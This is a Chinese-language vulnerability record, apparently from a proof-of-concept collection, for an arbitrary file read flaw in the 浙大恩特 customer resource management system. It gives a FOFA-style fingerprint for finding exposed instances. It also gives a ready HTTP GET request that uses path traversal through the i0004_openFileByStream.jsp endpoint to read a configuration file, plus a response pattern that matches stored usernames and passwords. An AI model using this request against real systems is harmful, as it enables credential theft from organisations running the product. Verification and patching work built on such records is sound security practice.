﻿# 浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口 任意文件读取漏洞

> 更新时间：2024-04-13

> 漏洞编号：

> 漏洞说明：浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源,提升销售和市场营销的效果。浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞。该漏洞可能会对系统的完整性和安全性产生严重影响。

> 漏洞特征：app="浙大恩特客户资源管理系统"

> 验证脚本：HTTP

```
GET /entsoft/module/i0004_openFileByStream.jsp?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?enter.user)(?=.*?enter.password).*?$

> 上传文件定位：

> 验证文件来源：浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口 任意文件读取漏洞.poc

